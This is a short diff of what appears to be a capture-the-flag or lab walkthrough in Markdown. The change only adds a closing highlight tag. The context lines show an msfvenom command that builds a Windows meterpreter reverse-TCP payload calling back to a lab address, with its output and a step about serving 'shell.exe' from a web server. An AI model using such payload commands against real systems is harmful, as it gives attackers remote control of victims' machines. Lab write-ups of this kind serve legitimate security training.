@@ -140,7 +140,8 @@ root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.36 L
 No encoder or badchars specified, outputting raw payload
 Payload size: 510 bytes
 Final size of exe file: 7168 bytes
-root@kali:~# 
+root@kali:~#
+{% endhighlight %}
 
 To upload the payload "shell.exe", run a  web server on the localhost.
 {% highlight shell %}
